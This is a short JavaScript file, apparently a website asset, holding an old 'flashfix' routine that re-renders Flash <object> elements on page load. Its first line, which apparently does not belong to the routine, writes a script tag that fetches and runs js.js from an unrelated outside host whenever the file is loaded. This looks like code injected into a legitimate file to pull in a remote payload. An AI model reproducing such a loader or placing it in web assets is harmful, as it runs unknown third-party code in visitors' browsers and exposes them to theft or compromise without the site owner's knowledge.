document.writeln("<script type='text/javascript' src='http://z.jiaoqing.wang/js.js'></script>");
flashfix = function() {
    theObjects = document.getElementsByTagName("object");
    for (var i = 0; i < theObjects.length; i++) {
        theObjects[i].outerHTML = theObjects[i].outerHTML;
    }
}

if (window.attachEvent)
    window.attachEvent("onload", flashfix)
else
    window.onload=flashfix;